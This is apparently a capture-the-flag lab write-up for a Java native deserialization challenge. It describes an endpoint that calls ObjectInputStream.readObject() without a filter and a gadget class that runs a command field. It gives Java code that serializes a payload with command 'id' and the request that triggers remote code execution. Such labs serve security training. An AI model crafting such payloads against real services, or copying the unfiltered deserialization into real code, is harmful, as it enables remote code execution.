# Level 1 — Java Native Deserialization

## Challenge Description

This challenge simulates a session restore service using `ObjectInputStream.readObject()` to deserialize user-submitted Base64-encoded data without any ObjectInputFilter. The application contains a `VulnerableTask` gadget class whose `readObject()` method auto-executes the `command` field.

**Objective**: Craft a serialized `VulnerableTask` object with a malicious command to trigger RCE during deserialization and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `NativeDeserController.java`

```
GET  /api/challenge/deser/native/info     — Get gadget class info
GET  /api/challenge/deser/native/session  — Get legitimate session token
POST /api/challenge/deser/native/restore  — Deserialize session (vulnerable entry)
```

**Gadget Class**:

| Property | Value |
|----------|-------|
| Class | `com.madrabbit.challenge.deser.VulnerableTask` |
| Interface | `java.io.Serializable` |
| serialVersionUID | `20250101L` |
| Field | `String command` |
| Trigger | `readObject()` auto-executes when `command` is non-empty |

**Vulnerability**: `ObjectInputStream` has no ObjectInputFilter, accepting deserialization of any class. The `VulnerableTask.readObject()` method auto-executes the `command` field during deserialization.

### Source Code Snippet

```java
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
    Object obj = ois.readObject();  // No ObjectInputFilter!
    String executionResult = VulnerableTask.getAndClearResult();
    if (executionResult != null) {
        String flag = flagService.getFlag("deserialization", "level1");
        result.put("flag", flag);
    }
}
```

## Walkthrough

### Step 1: Get Gadget Class Info

```
GET /api/challenge/deser/native/info
```

### Step 2: Craft Malicious Serialized Object

Create a matching `VulnerableTask` class locally and serialize with `command="id"`:

```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(new VulnerableTask("id"));
String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
```

### Step 3: Submit Malicious Data

```json
POST /api/challenge/deser/native/restore
{"sessionData": "<base64_payload>"}
```

### Step 4: Capture the Flag

RCE triggered successfully returns the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/deserialization/NativeDeserController.java` | Backend deserialization endpoint |
| `challenge/deser/VulnerableTask.java` | Gadget chain class |
| `service/FlagService.java` | Flag retrieval and validation |
